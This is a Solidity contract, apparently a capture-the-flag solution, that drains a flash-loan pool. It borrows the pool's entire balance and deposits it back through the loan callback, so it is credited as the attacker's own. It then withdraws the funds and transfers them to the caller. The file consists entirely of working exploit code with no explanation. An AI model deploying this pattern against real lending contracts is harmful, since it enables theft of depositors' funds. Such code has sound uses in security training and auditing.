// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function withdraw() external;
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
}

contract HackSideEntrance {
    IPool pool;
    constructor(IPool _pool) {
        pool = _pool;
    }

    function attack() external {
        uint256 _balance = address(pool).balance;
        pool.flashLoan(_balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value:msg.value}();
    }

    receive() payable external {}
}
